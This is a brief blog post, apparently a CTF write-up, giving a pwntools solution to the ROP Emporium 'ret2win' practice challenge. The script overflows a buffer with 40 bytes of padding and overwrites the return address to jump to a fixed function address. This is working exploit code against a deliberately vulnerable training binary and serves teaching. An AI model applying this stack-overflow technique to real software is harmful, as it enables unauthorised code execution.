---
layout: default
title: "rop emporium series"
category: "pwn"
tags: [pwn, x64, rop]
date: 2026-09-09
description: "my solutions for the challenges of the rop emporium series"
---

## ret2win
basic ret2win challenge, no mitigations

```python
from pwn import *
p = process('./ret2win')

payload = b'A'*40 + p64(0x0000000000400756)
p.recvuntil(b'> ')
p.send(payload)

p.interactive()
```
